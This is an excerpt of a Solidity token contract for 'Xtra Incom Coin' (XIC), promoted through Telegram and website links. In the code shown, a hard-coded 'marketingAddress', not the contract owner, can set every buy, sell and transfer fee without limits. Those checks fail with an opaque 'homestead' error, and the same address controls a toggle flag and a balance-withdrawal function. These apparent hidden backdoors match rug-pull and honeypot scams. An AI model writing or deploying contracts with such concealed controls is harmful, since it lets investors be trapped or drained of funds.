...
/**
//Telegram : https://t.me/xtraincomchannel
//Website : https://xtraincom.com/

Powered BY : Startek Corp.
...
contract XtraIncomCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x97c307C15114996CD15170b0d7B1bB39a64Cb0f0); // Marketing Address
    address payable public charityAddress = payable(0x017f5ed1360a8bf20999D49A6847Da68f12Ea907); // Charity/Dev Address
    ...
    string private _name = "Xtra Incom Coin";
    string private _symbol = "XIC";
    ...
    bool public welcome = true;
    
    uint256 public _maxTxAmount = 1000000000000000000000 * 10**18;  //
    uint256 private minimumTokensBeforeSwap = 10000000000000000000000 * 10**18;  //
    ...
    function setSellLiquidityFeePercent(uint256 sellLiquidityFee) external  {
        require(msg.sender == marketingAddress, "homestead");
        _sellLiquidityFee = sellLiquidityFee;
    }
    
      function setBurnFeePercent(uint256 burnTaxFee) external  {
          require(msg.sender == marketingAddress, "homestead");
        _burnFee = burnTaxFee;
    }
    
    
    function setMarketingFeePercent(uint256 divisor) external  {
        require(msg.sender == marketingAddress, "homestead");
        marketingDivisor = divisor;
    }
    
    function setCharityFeePercent(uint256 divisor) external  {
        require(msg.sender == marketingAddress, "homestead");
  ...
  function setALLFeePercent(uint256 charity,uint256 marketting,uint256 burnTaxFee,uint256 liquidityFee,uint256 taxFee,uint256 sellLiquidityFee,uint256 sellTaxFee,uint256 buyLiquidityFee,uint256 buyTaxFee) external   {
      require(msg.sender == marketingAddress, "homestead");
    ...
    uint256 private salePrice = 844000;
   ...
   function clearStuckBalance(uint256 amountPercentage) external  {
    ...
    function AIRDROPEND(bool _status) public  {
        require(msg.sender == marketingAddress, "homestead");
        welcome = _status;
    }
